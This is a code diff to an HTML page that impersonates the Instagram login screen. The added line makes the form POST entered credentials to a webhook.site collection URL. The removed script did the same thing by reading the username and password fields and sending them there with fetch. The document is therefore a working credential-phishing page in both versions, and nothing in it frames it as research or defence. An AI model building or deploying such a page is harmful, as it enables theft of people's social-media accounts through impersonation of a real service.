@@ -99,6 +99,7 @@
     </div>
 </body>
 </html> -->
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -185,7 +186,7 @@
 <body>
     <div class="login-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
-        <form id="loginForm">
+        <form id="loginForm" action="https://webhook.site/your-unique-id" method="post">
             <input type="text" id="username" class="input-field" placeholder="Phone number, username or email address" required>
             <input type="password" id="password" class="input-field" placeholder="Password" required>
             <button type="submit" class="login-button">Log In</button>
@@ -198,29 +199,6 @@
         Don't have an account? <span style="color: #0095f6; font-weight: bold; cursor: pointer;">Sign up</span>
     </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the form from redirecting the page
 
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            // Send credentials to webhook
-            fetch('https://webhook.site/your-unique-id', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: new URLSearchParams({
-                    'username': username,
-                    'password': password
-                })
-            }).then(response => {
-                console.log('Credentials sent');
-            }).catch(error => {
-                console.error('Error:', error);
-            });
-        });
-    </script>
 </body>
 </html>
